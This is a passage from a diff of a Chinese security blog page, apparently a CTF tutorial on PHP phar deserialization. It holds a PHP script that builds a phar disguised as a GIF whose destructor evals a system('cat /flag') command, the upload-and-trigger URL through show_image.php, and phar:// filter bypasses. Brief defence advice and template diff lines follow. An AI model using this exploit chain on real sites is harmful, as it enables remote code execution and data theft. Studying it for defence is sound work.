 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileVersionClass</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$fileSystem_version</span> = <span class="string">&#x27;1.0.0&#x27;</span>;<span class="comment">//这里要注意更改成符合if判断的条件</span></span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$output</span> = <span class="string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span>;<span class="comment">//构造恶意语句</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$realversion</span>=<span class="string">&#x27;1.0.0&#x27;</span>.<span class="keyword">$this</span>-&gt;fileSystem_version.<span class="string">&#x27;bak_version&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(version_compare(<span class="string">&#x27;1.0.0&#x27;</span>, <span class="variable">$realversion</span>)!==<span class="number">1</span>)&#123;</span><br><span class="line">                       <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">            &#125;;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> FileVersionClass();</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="comment">//设置stub，伪造gif</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>将生成的phar文件后缀改成.gif，上传，站点会给出上传的路径，最后在show_image.php页面进行文件操作</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_image.php?filename=phar://upload/background.gif</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_image.php?filename=phar:<span class="regexp">//u</span>pload/background.gif</span><br></pre></td></tr></table></figure>
 
 <h4 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:<span class="comment">//</span></span><br><span class="line">compress.bzip2:<span class="comment">//</span></span><br></pre></td></tr></table></figure>
 
@@ -358,200 +320,65 @@
 <h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>1.对unseralize中的参数进行严格过滤<br>2.对上传文件的内容进行检查</p>
 <p>Reference：<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a><br><a target="_blank" rel="noopener" href="https://www.geek-share.com/detail/2791677381.html">https://www.geek-share.com/detail/2791677381.html</a><br><a target="_blank" rel="noopener" href="http://123.57.164.1/2020/11/10/ctf%E4%B8%AD%E7%9A%84php%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">http://123.57.164.1/2020/11/10/ctf%E4%B8%AD%E7%9A%84php%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p>
 
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
         </div>
 
-        
+    </div>
+</div>
 
-        
-
-        
-            <div class="article-nav">
-                
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2022/01/20/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">php伪随机数</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2022/01/19/hello-world/"
-                        >
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">Hello World</span>
-                                <span class="post-nav-item">Next posts</span>
-                            </span>
-                            <span class="right arrow-icon flex-center">
-                              <i class="fas fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
-
-        
     </div>
 </div>
 
 
-                
-            </div>
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
 
-        </div>
+        
 
-        <div class="page-main-content-bottom">
-            <footer class="footer">
-    <div class="info-container">
-        <div class="copyright-info info-item">
-            &copy;
-            
-              <span>2020</span>
-              -
-            
-            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">noname</a>
-        </div>
         
-        <div class="theme-info info-item">
-            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
-        </div>
+
         
+
         
-    </div>
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
 </footer>
 
-        </div>
-    </div>
-
-    
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="tools-list">
-        <!-- TOC aside toggle -->
-        
-            <li class="tools-item page-aside-toggle">
-                <i class="fas fa-outdent"></i>
-            </li>
-        
-
-        <!-- go comment -->
-        
-    </ul>
-</div>
-
-        </div>
-    
-
-    <div class="right-bottom-side-tools">
-        <div class="side-tools-container">
-    <ul class="side-tools-list">
-        <li class="tools-item tool-font-adjust-plus flex-center">
-            <i class="fas fa-search-plus"></i>
-        </li>
-
-        <li class="tools-item tool-font-adjust-minus flex-center">
-            <i class="fas fa-search-minus"></i>
-        </li>
-
-        <li class="tools-item tool-expand-width flex-center">
-            <i class="fas fa-arrows-alt-h"></i>
-        </li>
-
-        <li class="tools-item tool-dark-light-toggle flex-center">
-            <i class="fas fa-moon"></i>
-        </li>
-
-        <!-- rss -->
-        
-
-        
-            <li class="tools-item tool-scroll-to-top flex-center">
-                <i class="fas fa-arrow-up"></i>
-            </li>
-        
-
-        <li class="tools-item tool-scroll-to-bottom flex-center">
-            <i class="fas fa-arrow-down"></i>
-        </li>
-    </ul>
-
-    <ul class="exposed-tools-list">
-        <li class="tools-item tool-toggle-show flex-center">
-            <i class="fas fa-cog fa-spin"></i>
-        </li>
-        
-    </ul>
-</div>
-
-    </div>
-
-    
-        <aside class="page-aside">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.</span> <span class="nav-text">php反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5"><span class="nav-number">1.1.</span> <span class="nav-text">相关概念</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.1.1.</span> <span class="nav-text">序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.1.2.</span> <span class="nav-text">反序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.</span> <span class="nav-text">php反序列化漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pop%E9%93%BE"><span class="nav-number">1.3.</span> <span class="nav-text">pop链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Example1"><span class="nav-number">1.3.0.1.</span> <span class="nav-text">Example1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XCTF-Web-php-unserialize"><span class="nav-number">1.3.0.2.</span> <span class="nav-text">XCTF-Web_php_unserialize</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phar%E6%89%A9%E5%B1%95%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-number">1.4.</span> <span class="nav-text">phar扩展反序列化攻击面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phar%E6%96%87%E4%BB%B6"><span class="nav-number">1.4.1.</span> <span class="nav-text">phar文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%97%E5%BD%B1%E5%93%8D%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">受影响的函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%9F%E6%88%90phar%E6%96%87%E4%BB%B6"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">生成phar文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0phar%E6%96%87%E4%BB%B6"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">伪造phar文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Example"><span class="nav-number">1.4.1.4.</span> <span class="nav-text">Example</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bypass"><span class="nav-number">1.4.1.5.</span> <span class="nav-text">bypass</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="nav-number">1.5.</span> <span class="nav-text">反序列化字符逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%84%E5%88%99"><span class="nav-number">1.5.1.</span> <span class="nav-text">规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%A2%9E%E5%8A%A0%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-number">1.5.2.</span> <span class="nav-text">字符增加的情况</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.6.</span> <span class="nav-text">session反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#session%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6"><span class="nav-number">1.6.1.</span> <span class="nav-text">session存储机制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8"><span class="nav-number">1.7.</span> <span class="nav-text">原生类利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SoapClient-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.7.1.</span> <span class="nav-text">SoapClient+反序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="nav-number">1.8.</span> <span class="nav-text">防御方法</span></a></li></ol></li></ol>
-    </div>
-</div>
-        </aside>
-    
-
-    <div class="image-viewer-container">
-    <img src="">
-</div>
-
-
-    
-
-</main>
-
-
-
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/main.js"></script>
-
-<script src="/js/header-shrink.js"></script>
-
-<script src="/js/back2top.js"></script>
-
-<script src="/js/dark-light-toggle.js"></script>
-
-
-
-
-
-    
-<script src="/js/code-copy.js"></script>
-
-
-
-
-
-<div class="post-scripts">
-    
-        
-<script src="/js/left-side-toggle.js"></script>
-
-<script src="/js/libs/anime.min.js"></script>
-
-<script src="/js/toc.js"></script>
-
-    
-</div>
 
 
 
 </body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
 </html>
